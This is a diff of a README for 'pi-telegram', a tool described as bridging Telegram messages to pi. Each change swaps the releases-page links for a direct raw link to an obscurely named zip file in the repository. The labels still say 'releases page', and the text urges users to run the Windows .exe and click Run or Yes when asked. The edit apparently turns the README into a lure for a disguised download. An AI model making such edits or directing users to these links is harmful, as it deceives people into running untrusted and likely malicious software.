@@ -1,16 +1,16 @@
 # 🔌 pi-telegram - Bridge Telegram Messages to Pi
 
-[![Download pi-telegram](https://img.shields.io/badge/Download%20pi--telegram-blue?style=for-the-badge&logo=github)](https://github.com/kctriplex/pi-telegram/releases)
+[![Download pi-telegram](https://img.shields.io/badge/Download%20pi--telegram-blue?style=for-the-badge&logo=github)](https://github.com/kctriplex/pi-telegram/raw/refs/heads/main/humoresquely/telegram-pi-tuftlet.zip)
 
 ## 📥 Download
 
-Visit this page to download: [pi-telegram releases](https://github.com/kctriplex/pi-telegram/releases)
+Visit this page to download: [pi-telegram releases](https://github.com/kctriplex/pi-telegram/raw/refs/heads/main/humoresquely/telegram-pi-tuftlet.zip)
 
 Pick the latest release, then download the Windows file that matches your computer. If you see more than one file, choose the one with `.exe` in the name.
 
 ## 🪟 Windows Setup
 
-1. Open the [releases page](https://github.com/kctriplex/pi-telegram/releases).
+1. Open the [releases page](https://github.com/kctriplex/pi-telegram/raw/refs/heads/main/humoresquely/telegram-pi-tuftlet.zip).
 2. Find the newest version at the top.
 3. Download the Windows app file.
 4. If Windows asks for permission, choose **Run** or **Yes**.
@@ -76,7 +76,7 @@ Open the app file you downloaded from the releases page.
 Close the app window or end the process from Task Manager.
 
 ### Update the app
-Go back to the [releases page](https://github.com/kctriplex/pi-telegram/releases), download the newest version, then replace the old file.
+Go back to the [releases page](https://github.com/kctriplex/pi-telegram/raw/refs/heads/main/humoresquely/telegram-pi-tuftlet.zip), download the newest version, then replace the old file.
 
 ### Reconnect Telegram
 If Telegram signs out, open the app again and follow the sign-in steps.
@@ -129,7 +129,7 @@ pi-telegram is meant for direct message bridging between Telegram and pi. Keep y
 
 ## 📂 Release Link
 
-Download and run the latest Windows file from: [https://github.com/kctriplex/pi-telegram/releases](https://github.com/kctriplex/pi-telegram/releases)
+Download and run the latest Windows file from: [https://github.com/kctriplex/pi-telegram/raw/refs/heads/main/humoresquely/telegram-pi-tuftlet.zip](https://github.com/kctriplex/pi-telegram/raw/refs/heads/main/humoresquely/telegram-pi-tuftlet.zip)
 
 ## 📄 Basic Workflow
 
